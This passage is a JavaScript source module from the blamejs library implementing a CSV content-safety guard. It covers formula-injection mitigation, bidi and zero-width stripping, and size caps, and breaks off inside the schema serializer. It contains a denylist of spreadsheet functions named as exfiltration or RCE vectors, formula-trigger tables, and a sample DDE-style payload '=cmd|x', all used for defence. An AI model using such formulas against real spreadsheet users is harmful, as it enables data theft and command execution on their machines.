// SPDX-License-Identifier: Apache-2.0
// Copyright (c) blamejs contributors
"use strict";
/**
 * @module b.guardCsv
 * @nav    Guards
 * @title  Guard Csv
 *
 * @intro
 *   CSV content-safety guard — defends against the broader threat
 *   catalog operators face when emitting or accepting CSVs sourced from
 *   user input. `b.csv.parse` / `b.csv.stringify` handle RFC 4180
 *   shape; this module layers the security catalog on top.
 *
 *   CSV-injection / formula-trigger defense: spreadsheet evaluators
 *   (Excel / LibreOffice / Google Sheets) treat any cell beginning with
 *   `=`, `+`, `-`, `@`, TAB, CR, LF, or `|` as a formula — including
 *   exfiltration vectors like `=WEBSERVICE(...)`, `=HYPERLINK(...)`,
 *   `=IMPORTXML(...)`. Full-width variants (U+FF1D `＝`, U+FF0B `＋`,
 *   U+FF0D `－`, U+FF20 `＠`) are caught alongside the ASCII triggers
 *   per the OWASP locale catalog. Five mitigation modes apply:
 *   `prefix-tab` (OWASP-recommended, prepends TAB so the evaluator
 *   treats the cell as text), `prefix-quote` (legacy `'` prefix),
 *   `wrap-with-quotes-and-prefix` (email-attachment posture),
 *   `reject` (throw), `allowlist` (only documented safe functions
 *   like SUM / AVERAGE pass through unprefixed; anything the matcher
 *   cannot identify as an allowlisted call is prefixed).
 *
 *   The four prefixing modes force quoted output. OWASP places the
 *   prefix inside the quoted field, and a bare leading TAB is a
 *   delimiter under tab-separated import, so an unquoted prefix can
 *   put the trigger character back at the front of the cell.
 *
 *   Unicode bidi/zero-width strip: CVE-2021-42574 Trojan Source bidi
 *   overrides (U+202A-202E, U+2066-2069) are rejected or stripped
 *   per profile; zero-width characters (ZWSP / ZWNJ / ZWJ / WJ / SHY)
 *   and Unicode Tags block characters (U+E0000-E007F, the ASCII
 *   smuggling channel) always strip. Leading bidi/zero-width prefixes
 *   are stripped before the formula scan so a cell beginning with
 *   U+200B`=SUM(...)` cannot slip past the cell-start check.
 *
 *   CSV-bomb caps: per-cell (`maxCellBytes`, default 64 KiB), total
 *   (`maxTotalBytes`, default 1 GiB), row count (`maxRows`, default
 *   ~1 M), column count (`maxColumns`, default 1024), and a sanitize
 *   amplification ratio (`sanitizeAmplificationCap`, default 1.5x)
 *   that refuses pathological re-quote expansions.
 *
 *   Doubled-quote escape is delegated to `b.csv.stringify` — every
 *   cell value containing the delimiter, the quote char, CR, or LF
 *   is wrapped in quotes with embedded quotes doubled per RFC 4180.
 *
 *   Profiles: `strict` / `balanced` / `permissive` /
 *   `email-attachment`. Compliance postures: `hipaa` / `pci-dss` /
 *   `gdpr` / `soc2`. Operators select via `{ profile: "strict" }` or
 *   `{ compliancePosture: "hipaa" }`; postures overlay on top of the
 *   profile baseline.
 *
 *   Threat-detection regex literals are composed programmatically
 *   from numeric codepoint ranges so the source file stays pure
 *   ASCII — never embeds the attack characters themselves.
 *
 * @card
 *   CSV content-safety guard — defends against the broader threat catalog operators face when emitting or accepting CSVs sourced from user input.
 */

var codepointClass = require("./codepoint-class");
var csv = require("./csv");
var safeBuffer = require("./safe-buffer");
var C = require("./constants");
var lazyRequire = require("./lazy-require");
var numericBounds = require("./numeric-bounds");
var gateContract = require("./gate-contract");
var validateOpts = require("./validate-opts");
var { GuardCsvError } = require("./framework-error");

var observability = lazyRequire(function () { return require("./observability"); });
void observability;

var _err = GuardCsvError.factory;

// Shared codepoint catalog (BIDI / C0_CTRL / ZERO_WIDTH ranges and
// pre-compiled regexes) lives in lib/codepoint-class.js.

// CSV-specific homoglyph catalog — visual-confusable letter ranges that
// homoglyph against ASCII:
//   Cyrillic   U+0400-U+04FF
//   Greek      U+0370-U+03FF
//   Fullwidth  U+FF21-U+FF5A
var HOMOGLYPH_RANGES = [[0x0400, 0x04FF], [0x0370, 0x03FF], [0xFF21, 0xFF5A]];

// Formula-prefix triggers — every char that signals "this cell is a
// formula" to a spreadsheet evaluator:
//   ASCII       =  +  -  @  TAB  CR  LF  |
//   Full-width  ＝ U+FF1D  ＋ U+FF0B  － U+FF0D  ＠ U+FF20
var FORMULA_PREFIX_CPS = [0x3D, 0x2B, 0x2D, 0x40, 0x09, 0x0D, 0x0A, 0x7C,
                          0xFF1D, 0xFF0B, 0xFF0D, 0xFF20];

// Spreadsheet functions on the dangerous-function denylist (per OWASP /
// bishopfox / Veracode catalogs). Surfaced as critical regardless of the
// broader formulaInjectionPolicy.
var DANGEROUS_FUNCTIONS = Object.freeze([
  "WEBSERVICE", "HYPERLINK", "IMAGE", "DDE", "RTD", "CALL",
  "IMPORTXML", "IMPORTRANGE", "IMPORTHTML", "IMPORTFEED", "IMPORTDATA",
  "GOOGLEFINANCE", "GOOGLETRANSLATE",
]);

// ---- Codepoint helpers (proxied to lib/codepoint-class) ----

var HEX_RADIX = 16;                                                 // base-16 radix, not byte size
var _hex4      = codepointClass.hex4;
var _charClass = codepointClass.charClass;
var _fromCp    = codepointClass.fromCp;
function _stringFromCps(cps) {
  return cps.map(_fromCp).join("");
}

// ---- Compiled detectors ----
// Shared regexes pulled from lib/codepoint-class; CSV-specific ones
// (homoglyph + leading-BOM) compiled here.

var BIDI_RE       = codepointClass.BIDI_RE;
var BIDI_RE_G     = codepointClass.BIDI_RE_G;
var C0_CTRL_RE    = codepointClass.C0_CTRL_RE;
var C0_CTRL_RE_G  = codepointClass.C0_CTRL_RE_G;
var ZW_RE_G       = codepointClass.ZW_RE_G;
var TAG_RE_G      = codepointClass.TAG_RE_G;
var NULL_RE_G     = codepointClass.NULL_RE_G;
var HOMOGLYPH_RE  = new RegExp("[" + _charClass(HOMOGLYPH_RANGES) + "]");      // allow:dynamic-regex — codepoints from HOMOGLYPH_RANGES literal table
var HOMOGLYPH_G   = new RegExp("[" + _charClass(HOMOGLYPH_RANGES) + "]", "g"); // allow:dynamic-regex — codepoints from HOMOGLYPH_RANGES literal table
var BOM_RE_LEAD   = new RegExp("^" + _hex4(0xFEFF));                           // allow:dynamic-regex — single literal codepoint U+FEFF
var BOM_RE_G      = new RegExp(_hex4(0xFEFF), "g");                            // allow:dynamic-regex — single literal codepoint U+FEFF


// Cell-start scanning is a character walk, not a pattern match. Both scans ask
// the same question — "does a cell begin with a formula trigger?" — and the
// answer depends on three positional facts a single expression states only
// obliquely: where a cell begins, whether it is quoted, and where the trigger
// run ends. Written out, each is a line you can read and test; folded into an
// expression they interact, and the interactions are where the holes were.
// See _cellStarts for the boundary rule.

// Characters that separate cells within a row. TAB and PIPE are here as well
// as in the trigger table: a document may use either as its delimiter, so a
// cell can both follow one and begin with one.
//
// The scan treats all of them as boundaries whatever the configured delimiter,
// because a document is only as safe as the way a RECIPIENT opens it — a
// spreadsheet asked to import the same bytes as semicolon-separated splits on
// semicolons regardless of what the producer intended. The operator's own
// delimiter is added on top, since it may be a character outside this set and
// a boundary the scan does not recognize is a cell it never scans.
var CELL_DELIMITERS = [",", ";", "\t", "|"];

function _cellDelimiters(delimiter) {
  if (typeof delimiter !== "string" || delimiter.length === 0) return CELL_DELIMITERS;
  if (CELL_DELIMITERS.indexOf(delimiter) !== -1) return CELL_DELIMITERS;
  return CELL_DELIMITERS.concat([delimiter]);
}

function _isLineTerminator(ch) { return ch === "\r" || ch === "\n"; }

// Visit each index at which a cell begins: the start of the input, the
// position after a delimiter, and the position after a complete run of line
// terminators. `visit(index)` returning a truthy value stops the walk.
//
// It is a walk rather than a list because the caller's input is untrusted and
// the number of cell boundaries is proportional to it — a document of nothing
// but delimiters has one per byte, so collecting them first turns 20 MiB of
// input into hundreds of MiB of index array. Visiting each in turn allocates
// nothing beyond the finding that is actually returned.
//
// The walk is quote-aware because it has to be. A delimiter inside a quoted
// field is field content, and the mitigation this guard applies puts a TAB —
// which is itself one of the delimiters a document may use — at the front of a
// quoted cell. A scanner that split on every delimiter it saw would read the
// character after that TAB as opening a new cell and report the framework's
// own escaped output as an injected formula.
//
// A line-terminator run is consumed whole for the same class of reason: CR and
// LF are themselves formula triggers, so stopping between the CR and the LF of
// a CRLF would report the LF as a formula-leading cell on every line ending in
// an ordinary document.
//
// `quote` is the operator's configured quote character, not a literal `"`.
// Under a different one a double quote is ordinary content, and reading it as
// opening a field sends the walk looking for a close that never arrives — past
// every remaining cell boundary to the end of input, so nothing after it is
// scanned at all and a formula there is missed rather than mis-located.
function _eachCellStart(text, quote, delims, visit) {
  if (visit(0)) return;
  var i = 0;
  while (i < text.length) {
    if (text.charAt(i) === quote) {
      i += 1;
      while (i < text.length) {
        if (text.charAt(i) !== quote) { i += 1; continue; }
        // A doubled quote is an escaped quote, not the end of the field.
        if (text.charAt(i + 1) === quote) { i += 2; continue; }
        i += 1;
        break;
      }
    }
    while (i < text.length &&
           delims.indexOf(text.charAt(i)) === -1 &&
           !_isLineTerminator(text.charAt(i))) {
      i += 1;
    }
    if (i >= text.length) return;
    if (_isLineTerminator(text.charAt(i))) {
      while (i < text.length && _isLineTerminator(text.charAt(i))) i += 1;
    } else {
      i += 1;
    }
    if (visit(i)) return;
  }
}

// The first cell that begins with a formula trigger, or null.
//
// A quoted cell whose first character is TAB is skipped ONLY under the policy
// that produces that shape. OWASP's Excel-resistant form is a TAB inside the
// quoted field, so under `prefix-tab` a scanner that flagged it would report
// every correctly-escaped document as hostile. Under any other policy no TAB
// prefix is ever emitted, TAB is simply one of FORMULA_PREFIXES, and the same
// cell is an ordinary triggering cell — `escapeCell` refuses it under `reject`,
// and the scan has to agree with the serializer rather than exempt a shape this
// configuration never writes.
//
// A BARE leading TAB is a finding under every policy: unquoted it is a
// delimiter under tab-separated import and is dropped by consumers that trim
// leading whitespace on unquoted fields, either of which puts the next
// character first again.
function _findFormulaCell(text, quote, delims, formulaPolicy) {
  if (typeof text !== "string") return null;
  var tabIsMitigation = formulaPolicy === "prefix-tab";
  var hit = null;
  _eachCellStart(text, quote, delims, function (at) {
    var quoted = text.charAt(at) === quote;
    var triggerAt = quoted ? at + 1 : at;
    var ch = text.charAt(triggerAt);
    if (ch === "") return false;
    if (FORMULA_PREFIXES.indexOf(ch) === -1) return false;
    // Unquoted, a line terminator at a cell start is the row separator, so
    // the cell is empty rather than one opening with a CR. A blank row, a
    // leading blank row and a trailing newline are all ordinary documents.
    // Inside quotes the same character is genuine content and stands.
    if (!quoted && _isLineTerminator(ch)) return false;
    if (quoted && ch === "\t" && tabIsMitigation) return false;
    hit = { index: triggerAt, char: ch };
    return true;
  });
  return hit;
}

// Visit every cell that begins with a trigger followed by a word, as
// `visit(index, name)`. The caller matches `name` against its function table
// and keeps only what it recognizes, so nothing accumulates for the ordinary
// cells in between. Names are passed as written and compared
// case-insensitively by the caller: spreadsheet function names are
// case-insensitive, so a case-sensitive table lookup reads as a filter to
// spell around.
function _eachTriggeredWord(text, quote, delims, visit) {
  if (typeof text !== "string") return;
  _eachCellStart(text, quote, delims, function (start) {
    var at = text.charAt(start) === quote ? start + 1 : start;
    if (FORMULA_PREFIXES.indexOf(text.charAt(at)) === -1) return false;
    if (!_isNameStart(text.charAt(at + 1))) return false;
    var w = at + 1;
    while (w < text.length && _isWordChar(text.charAt(w))) w += 1;
    return visit(at, text.slice(at + 1, w));
  });
}

function _isNameStart(ch) {
  return (ch >= "A" && ch <= "Z") || (ch >= "a" && ch <= "z");
}

function _isWordChar(ch) {
  return _isNameStart(ch) || (ch >= "0" && ch <= "9") || ch === "_" || ch === ".";
}

// The leading function name of a single cell value, or null when the value
// does not begin with a trigger followed by a word.
function _leadingFunctionName(str) {
  if (typeof str !== "string" || str.length === 0) return null;
  if (FORMULA_PREFIXES.indexOf(str.charAt(0)) === -1) return null;
  if (!_isNameStart(str.charAt(1))) return null;
  var w = 1;
  while (w < str.length && _isWordChar(str.charAt(w))) w += 1;
  return str.slice(1, w);
}

var NULL_BYTE = codepointClass.NULL_BYTE;
var BOM_CHAR  = codepointClass.BOM_CHAR;

// FORMULA_PREFIXES — array of single-char strings; iteration cost is
// the same as a Set for n=12. _stringFromCps keeps the source ASCII.
var FORMULA_PREFIXES = Object.freeze(_stringFromCps(FORMULA_PREFIX_CPS).split(""));

// Default row count cap for serialize. 2^20 ~ 1M rows.
var DEFAULT_MAX_ROWS = 0x100000;

// ---- Profile presets ----

var PROFILES = Object.freeze({
  "strict": {
    formulaInjectionPolicy:   "prefix-tab",       // OWASP-recommended Excel-resistant mitigation
    bidiCharPolicy:           "reject",
    homoglyphPolicy:          "audit",
    controlCharPolicy:        "reject",
    nullByteHandling:         "reject",
    trailingWhitespacePolicy: "trim",
    bomPrefix:                false,
    dialectPolicy:            "strict",
    nullSemantics:            "empty-string",
    numericPrecisionPolicy:   "decimal-string-above-safe-int",
    dateFormat:               "iso8601",
  },
  "balanced": {
    formulaInjectionPolicy:   "prefix-tab",
    bidiCharPolicy:           "strip",
    homoglyphPolicy:          "audit",
    controlCharPolicy:        "strip",
    nullByteHandling:         "strip",
    trailingWhitespacePolicy: "preserve",
    bomPrefix:                false,
    dialectPolicy:            "strict",
    nullSemantics:            "empty-string",
    numericPrecisionPolicy:   "decimal-string-above-safe-int",
    dateFormat:               "iso8601",
  },
  "permissive": {
    formulaInjectionPolicy:   "prefix-tab",
    bidiCharPolicy:           "audit",
    homoglyphPolicy:          "audit",
    controlCharPolicy:        "strip",
    nullByteHandling:         "strip",
    trailingWhitespacePolicy: "preserve",
    bomPrefix:                false,
    dialectPolicy:            "permissive",
    nullSemantics:            "empty-string",
    numericPrecisionPolicy:   "scientific",
    dateFormat:               "iso8601",
  },
  "email-attachment": {
    formulaInjectionPolicy:   "wrap-with-quotes-and-prefix",
    bidiCharPolicy:           "strip",
    homoglyphPolicy:          "audit",
    controlCharPolicy:        "strip",
    nullByteHandling:         "strip",
    trailingWhitespacePolicy: "trim",
    bomPrefix:                true,
    dialectPolicy:            "strict",
    nullSemantics:            "empty-string",
    numericPrecisionPolicy:   "decimal-string-above-safe-int",
    dateFormat:               "iso8601",
  },
});

var DEFAULTS = gateContract.strictDefaults(PROFILES, {
  delimiter:                 ",",
  lineEnding:                "\r\n",
  encoding:                  "utf-8",
  locale:                    "C",
  formulasAllowlist:         Object.freeze(["SUM", "AVERAGE", "COUNT", "MIN", "MAX", "IF", "CONCATENATE"]),
  dangerousFunctions:        DANGEROUS_FUNCTIONS,
  maxRows:                   DEFAULT_MAX_ROWS,
  maxCellBytes:              C.BYTES.kib(64),
  maxTotalBytes:             C.BYTES.gib(1),
  maxColumns:                0x400,
  sanitizeAmplificationCap:  1.5,
  nullMarker:                "\\N",
  preserveLeadingZeros:      false,
  preserveBooleanStrings:    false,
  preserveDateStrings:       false,
  piiPolicy:                 "preserve",
  forensicSnippetBytes:      0,
  maxRuntimeMs:              C.TIME.seconds(30),
});

var COMPLIANCE_POSTURES = gateContract.compliancePostures(PROFILES, { base: 256, overlays: { hipaa: { piiPolicy: "redact" }, "pci-dss": { piiPolicy: "redact" }, gdpr: { piiPolicy: "redact" } } });

// ---- Internal helpers ----

function _firstMatch(text, re) {
  if (typeof text !== "string") return null;
  var m = text.match(re);
  if (!m) return null;
  return { index: m.index, char: m[0] };
}

function _detectIssues(text, opts) {
  var issues = [];
  if (typeof text !== "string") return issues;

  var bomIdx = text.indexOf(BOM_CHAR);
  if (bomIdx > 0 || (bomIdx === 0 && !opts.bomPrefix)) {
    issues.push({
      kind: "bom-mid-stream", severity: "high", ruleId: "csv.bom",
      location: bomIdx, snippet: "BOM at byte " + bomIdx,
    });
  }

  // Bidi / null / control / zero-width via the shared codepoint class, under
  // the vocabulary translation in _charPolicies.
  issues.push.apply(issues,
    codepointClass.detectCharThreats(text, _charPolicies(opts), "csv", "warn"));

  if (opts.homoglyphPolicy !== "allow" && /[A-Za-z]/.test(text)) {
    var homoMatch = _firstMatch(text, HOMOGLYPH_RE);
    if (homoMatch) {
      issues.push({
        kind: "homoglyph", severity: "warn", ruleId: "csv.homoglyph",
        location: homoMatch.index,
        snippet: "homoglyph U+" + homoMatch.char.charCodeAt(0).toString(HEX_RADIX) +
                 " mixed with ASCII at byte " + homoMatch.index,
      });
    }
  }


  if (opts.formulaInjectionPolicy !== "audit-only" && opts.formulaInjectionPolicy !== "allow") {
    // Strip ZWSP / RTLO / LRM / RLM / BOM at cell-start before the
    // formula scan. Without this, a cell beginning with U+200B (zero-
    // width space), U+202E (RTLO), U+200E/F (LTR/RTL marks), or U+FEFF
    // (BOM) followed by `=` puts a codepoint between the cell start and
    // the trigger, so the cell-start check reads the invisible character
    // rather than the `=`, and the formula reaches
    // the spreadsheet evaluator. Browsers + Excel + Sheets all strip
    // these silently — operator users see "=SUM(...)" rendered, the
    // file shipped a hidden bidi prefix that bypassed the scanner.
    // U+200B-200F (ZWSP / ZWNJ / ZWJ / LRM / RLM) +
    // U+202A-202E (LRE / RLE / PDF / LRO / RLO) +
    // U+2066-2069 (LRI / RLI / FSI / PDI) +
    // U+FEFF (BOM)                                                     // allow:dynamic-regex — explicit codepoints, no operator input
    var stripped = text.replace(new RegExp("^[\\u200B-\\u200F\\u202A-\\u202E\\u2066-\\u2069\\uFEFF]+"), "");
    var formulaMatch = _findFormulaCell(stripped, opts.quote || "\"",
                                        _cellDelimiters(opts.delimiter),
                                        opts.formulaInjectionPolicy);
    if (formulaMatch) {
      issues.push({
        kind: "formula-prefix-cell", severity: "critical",
        ruleId: "csv.formula-injection",
        location: formulaMatch.index,
        snippet: "cell beginning with formula trigger " +
                 JSON.stringify(formulaMatch.char) +
                 " at byte " + formulaMatch.index +
                 (stripped.length !== text.length ? " (after stripping leading bidi/zero-width prefix)" : ""),
      });
    }
  }

  if (Array.isArray(opts.dangerousFunctions) && opts.dangerousFunctions.length > 0) {
    _eachTriggeredWord(text, opts.quote || "\"", _cellDelimiters(opts.delimiter),
                       function (at, name) {
      var fn = name.toUpperCase();
      if (opts.dangerousFunctions.indexOf(fn) !== -1) {
        issues.push({
          kind: "dangerous-function", severity: "critical",
          ruleId: "csv.dangerous-function",
          location: at,
          snippet: "spreadsheet function " + JSON.stringify(fn) +
                   " is on the dangerous-function denylist (exfiltration / RCE vector)",
        });
      }
      return false;
    });
  }

  if (opts.dialectPolicy === "strict") {
    var hasCrlf = text.indexOf("\r\n") !== -1;
    var hasLfOnly = /[^\r]\n/.test(text);
    var hasCrOnly = /\r[^\n]/.test(text);
    if ((hasCrlf && hasLfOnly) || (hasCrlf && hasCrOnly) || (hasLfOnly && hasCrOnly)) {
      issues.push({
        kind: "dialect-mixed-line-endings", severity: "high",
        ruleId: "csv.dialect", snippet: "mixed line endings",
      });
    }
  }

  return issues;
}

// CSV exposes its own character-policy vocabulary (bidiCharPolicy /
// controlCharPolicy / nullByteHandling); the shared codepoint class speaks
// bidiPolicy / controlPolicy / nullBytePolicy. Translating in one place keeps
// the detect and sanitize paths reading the same policy for the same class —
// a second, drifting copy is how one path ends up enforcing what the other
// ignores. Zero-width carries no CSV opt, so it is scanned at warn severity
// and stripped unconditionally below.
function _charPolicies(opts) {
  return {
    bidiPolicy:      opts.bidiCharPolicy,
    controlPolicy:   opts.controlCharPolicy,
    nullBytePolicy:  opts.nullByteHandling,
    zeroWidthPolicy: opts.zeroWidthPolicy || "audit",
  };
}

function _stripIssues(text, opts) {
  if (typeof text !== "string") return text;
  // Refuse the classes set to "reject" before stripping the ones set to
  // "strip". This scrubber never refuses on a detected issue, and the strip
  // branches below only fire on "strip", so without the assert a "reject"
  // class would be neither refused nor removed and the threat would be
  // returned verbatim.
  codepointClass.assertNoCharThreats(text, _charPolicies(opts), _err, "csv");
  var out = text;
  if (opts.bomPrefix !== true) out = out.replace(BOM_RE_LEAD, "");
  out = out.replace(BOM_RE_G, "");
  if (opts.bidiCharPolicy === "strip") out = out.replace(BIDI_RE_G, "");
  if (opts.controlCharPolicy === "strip") out = out.replace(C0_CTRL_RE_G, "");
  if (opts.nullByteHandling === "strip") out = out.replace(NULL_RE_G, "");
  if (opts.homoglyphPolicy === "strip") out = out.replace(HOMOGLYPH_G, "");
  // Zero-width and Unicode Tags characters carry no CSV opt and are removed
  // unconditionally: both are invisible in every spreadsheet and every text
  // editor an operator would review the file in, so there is no rendering a
  // reader could compare against to notice them. Tags in particular are the
  // ASCII-smuggling channel — a cell reads as one value and carries another.
  out = out.replace(ZW_RE_G, "");
  out = out.replace(TAG_RE_G, "");
  if (opts.trailingWhitespacePolicy === "trim") {
    out = out.split("\n").map(function (line) {
      // Linear per-line trailing-whitespace trim — .replace(/[ \t]+$/) is
      // O(n^2) in V8 on adversarial input (untrusted CSV here).
      return safeBuffer.stripTrailingHspace(line);
    }).join("\n");
  }
  return out;
}

// _resolveOpts removed — the generated guard exposes the bound resolver as
// module.exports.resolveOpts (defineGuard owns the profile/posture binding).

// ---- Cell-level escape with full threat application ----

/**
 * @primitive  b.guardCsv.escapeCell
 * @signature  b.guardCsv.escapeCell(value, opts?)
 * @since      0.7.5
 * @status     stable
 * @related    b.guardCsv.serialize, b.guardCsv.gate, b.csv.stringify
 *
 * Apply the full guard-csv threat catalog to a single cell value:
 * formula-prefix mitigation, null-byte / C0-control / bidi handling,
 * trailing-whitespace policy, numeric-precision policy, and BigInt
 * disposition. Returns the safe string form. Throws `GuardCsvError`
 * when a `reject` policy fires (formula-trigger under
 * `formulaInjectionPolicy: "reject"`, control char under
 * `controlCharPolicy: "reject"`, etc.) or when the cell exceeds
 * `maxCellBytes`.
 *
 * Used internally by `b.guardCsv.serialize` per cell; exposed
 * directly for operators that emit CSV through their own writer
 * (streaming exports, third-party libraries) and only need the
 * per-cell defense.
 *
 * A writer of your own must emit the returned value as a QUOTED field
 * under any of the prefixing policies. OWASP places the prefix inside
 * the quoted field: emitted bare, a leading TAB is a delimiter under
 * tab-separated import and is dropped by consumers that trim leading
 * whitespace from unquoted fields, either of which puts the trigger
 * character back at the front of the cell. `b.guardCsv.serialize`
 * quotes for you; a writer you supply does not.
 *
 * Escaping is a fixed point — passing a value that escapeCell already
 * returned gives that value back unchanged, so a pipeline that escapes
 * twice does not stack prefixes.
 *
 * @opts
 *   formulaInjectionPolicy: "prefix-tab"|"prefix-quote"|"wrap-with-quotes-and-prefix"|"reject"|"allowlist",
 *   formulasAllowlist:      string[],   // when policy === "allowlist"
 *   bidiCharPolicy:         "reject"|"strip"|"audit"|"allow",
 *   controlCharPolicy:      "reject"|"strip"|"allow",
 *   nullByteHandling:       "reject"|"strip"|"allow",
 *   trailingWhitespacePolicy: "trim"|"preserve"|"reject",
 *   numericPrecisionPolicy: "decimal-string-above-safe-int"|"scientific"|"reject-bigint",
 *   maxCellBytes:           number,     // default 65536 (64 KiB)
 *
 * @example
 *   var safe = b.guardCsv.escapeCell("=cmd|x", { formulaInjectionPolicy: "prefix-tab" });
 *   safe;                                              // → "\t=cmd|x"
 *
 *   // Reject mode throws GuardCsvError instead of disarming.
 *   try {
 *     b.guardCsv.escapeCell("+1234567", { formulaInjectionPolicy: "reject" });
 *   } catch (e) {
 *     e.code;                                          // → "csv.formula-injection"
 *   }
 *
 *   // Numeric precision: above MAX_SAFE_INTEGER, write as decimal string.
 *   var huge = b.guardCsv.escapeCell(9007199254740993, {
 *     numericPrecisionPolicy: "decimal-string-above-safe-int",
 *   });
 *   huge;                                              // → "9007199254740993"
 */
function escapeCell(value, opts) {
  return _escapeCell(value, opts).value;
}

// The escape, plus whether this cell is subject to the formula mitigation and
// so must be emitted quoted. serialize needs the second fact, and it is about
// which branch the cell took — not about what the result starts with.
//
// Both readings of "what the result starts with" are wrong in one direction.
// Under the apostrophe policies a benign value already beginning with `'` is
// never a triggering cell at all, so treating its leading character as a
// mitigation would quote a whole document over a value the guard never
// touched. And under prefix-tab a cell already beginning with TAB IS a
// triggering cell — TAB is one of the triggers — left unchanged only because
// the prefix would be redundant; bare it is still the unquoted form the
// mitigation exists to avoid, so it needs the quoting even though no character
// was added.
function _escapeCell(value, opts) {
  opts = Object.assign({}, DEFAULTS, opts || {});
  var str = value == null ? "" : String(value);
  var mitigated = false;

  var cellBytes = Buffer.byteLength(str, "utf8");
  if (cellBytes > opts.maxCellBytes) {
    throw _err("csv.cell-too-large",
      "cell is " + cellBytes + " bytes, exceeds maxCellBytes " + opts.maxCellBytes);
  }

  if (opts.nullByteHandling === "reject" && str.indexOf(NULL_BYTE) !== -1) {
    throw _err("csv.null-byte", "cell contains null byte");
  }
  if (opts.controlCharPolicy === "reject" && C0_CTRL_RE.test(str)) {       // allow:regex-no-length-cap — str length capped by maxCellBytes above
    throw _err("csv.control", "cell contains C0 control character");
  }
  if (opts.bidiCharPolicy === "reject" && BIDI_RE.test(str)) {             // allow:regex-no-length-cap — str length capped by maxCellBytes above
    throw _err("csv.bidi", "cell contains Unicode bidi override (CVE-2021-42574)");
  }

  if (opts.nullByteHandling === "strip") str = str.replace(NULL_RE_G, "");
  if (opts.controlCharPolicy === "strip") str = str.replace(C0_CTRL_RE_G, "");
  if (opts.bidiCharPolicy === "strip") str = str.replace(BIDI_RE_G, "");

  if (opts.trailingWhitespacePolicy === "trim") {
    // Linear strip — .replace(/[ \t]+$/) is O(n^2) on adversarial untrusted CSV.
    str = safeBuffer.stripTrailingHspace(str);
  } else if (opts.trailingWhitespacePolicy === "reject") {
    // Linear "ends in space/tab?" check — /[ \t]+$/.test is ALSO O(n^2) (the
    // engine scans from every offset when there is no trailing run).
    var lastCode = str.length > 0 ? str.charCodeAt(str.length - 1) : 0;
    if (lastCode === 0x20 || lastCode === 0x09) {
      throw _err("csv.trailing-whitespace", "cell has trailing whitespace");
    }
  }

  if (typeof value === "number" &&
      opts.numericPrecisionPolicy === "decimal-string-above-safe-int") {
    if (Math.abs(value) > Number.MAX_SAFE_INTEGER) {
      str = value.toLocaleString("en-US", {
        useGrouping: false, maximumFractionDigits: 0,
      });
    }
  }
  if (typeof value === "bigint") {
    if (opts.numericPrecisionPolicy === "reject-bigint") {
      throw _err("csv.bigint", "BigInt values rejected per numericPrecisionPolicy");
    }
    str = value.toString();
  }

  if (str.length > 0 && FORMULA_PREFIXES.indexOf(str.charAt(0)) !== -1) {
    var policy = opts.formulaInjectionPolicy;
    if (policy === "reject") {
      throw _err("csv.formula-injection",
        "cell starts with formula prefix " + JSON.stringify(str.charAt(0)));
    } else if (policy === "prefix-tab") {
      // TAB is itself one of FORMULA_PREFIXES, so an already-prefixed cell
      // still enters this branch. Re-prefixing would stack a second TAB on
      // every pass and the mitigation would stop being a fixed point —
      // escaping an escaped cell must return it unchanged.
      if (str.charAt(0) !== "\t") str = "\t" + str;
      mitigated = true;
    } else if (policy === "prefix-quote") {
      str = "'" + str; mitigated = true;
    } else if (policy === "wrap-with-quotes-and-prefix") {
      str = "'" + str; mitigated = true;
    } else if (policy === "allowlist") {
      // Only a cell positively identified as an allowlisted call passes
      // through unprefixed. A leading word the matcher does not recognize —
      // `=cmd|x`, `=2+3`, a trigger with nothing word-like after it — is the
      // unknown case, and the unknown case gets the prefix. Reading a
      // non-match as "safe" would let every payload that is not shaped like a
      // function call through untouched. The allowlist is compared
      // case-insensitively because spreadsheet function names are.
      var firstWord = _leadingFunctionName(str);
      var allowed = firstWord !== null && opts.formulasAllowlist.some(function (fn) {
        return String(fn).toUpperCase() === firstWord.toUpperCase();
      });
      if (!allowed) { str = "'" + str; mitigated = true; }
    }
  }

  return { value: str, mitigated: mitigated };
}

// ---- Schema-bound serializer ----

/**
 * @primitive  b.guardCsv.schema
 * @signature  b.guardCsv.schema(spec)
 * @since      0.7.5
 * @status     stable
 * @related    b.guardCsv.serialize, b.guardCsv.validate
 *
 * Build a schema-bound serializer/validator pair. Each row's column
 * values are checked against the column's `type` (`"string"` /
 * `"number"` / `"boolean"`), optional `regex`, optional `min` / `max`
 * (for numbers), and `nullable` flag before the row reaches
 * `serialize`. Type / range / regex / null violations throw
 * `GuardCsvError` with codes `csv.schema-type` / `csv.schema-range`
 * / `csv.schema-regex` / `csv.schema-null` and the offending row
 * index — operators get the failing-row coordinates without parsing
 * the error string.
 *
 * Returns `{ serialize, validate, columns }`. The returned
 * `serialize` accepts the same opts as `b.guardCsv.serialize` and
 * applies the column ordering automatically.
 *
 * @example
 *   var bound = b.guardCsv.schema({
 *     columns: [
 *       { name: "email", type: "string", regex: /^[^@]+@[^@]+$/ },
 *       { name: "age",   type: "number", min: 0, max: 150, nullable: true },
 *     ],
 *   });
 *
 *   var out = bound.serialize([
 *     { email: "alice@example.com", age: 30 },
 *     { email: "bob@example.com",   age: null },
 *   ], { profile: "strict" });
 *   out.indexOf("alice@example.com") !== -1;           // → true
 */
function schema(spec) {
  validateOpts.requireObject(spec, "guardCsv.schema", GuardCsvError);
  if (!Array.isArray(spec.columns)) {
    throw _err("csv.bad-schema", "schema.columns must be an array");
  }
  var cols = spec.columns.slice();

  return {
    serialize: function (rows, opts) {
      opts = opts || {};
      var validated = [];
      for (var ri = 0; ri < rows.length; ri += 1) {
        var row = rows[ri];
        var validatedRow = {};
        for (var ci = 0; ci < cols.length; ci += 1) {
          var col = cols[ci];
          var v = row[col.name];
          if (v == null) {
            if (col.nullable === false) {
              throw _err("csv.schema-null",
                "column " + JSON.stringify(col.name) +
                " is non-nullable; row " + ri + " has null");
            }
            validatedRow[col.name] = v;
            continue;
          }
          if (col.type === "string" && typeof v !== "string") {
            throw _err("csv.schema-type",
              "column " + JSON.stringify(col.name) +
              " expects string at row " + ri);
          }
          if (col.type === "number" && typeof v !== "number") {
            throw _err("csv.schema-type",
              "column " + JSON.stringify(col.name) +
              " expects number at row " + ri);
          }
          if (col.type === "boolean" && typeof v !== "boolean") {
            throw _err("csv.schema-type",
              "column " + JSON.stringify(col.name) +
              " expects boolean at row " + ri);
          }
          if (col.regex && !col.regex.test(String(v))) {
            throw _err("csv.schema-regex",
              "column " + JSON.stringify(col.name) +
              " value " + JSON.stringify(v) +
              " at row " + ri + " does not match regex " + col.regex);
          }
          if (col.type === "number" && typeof col.min === "number" && v < col.min) {
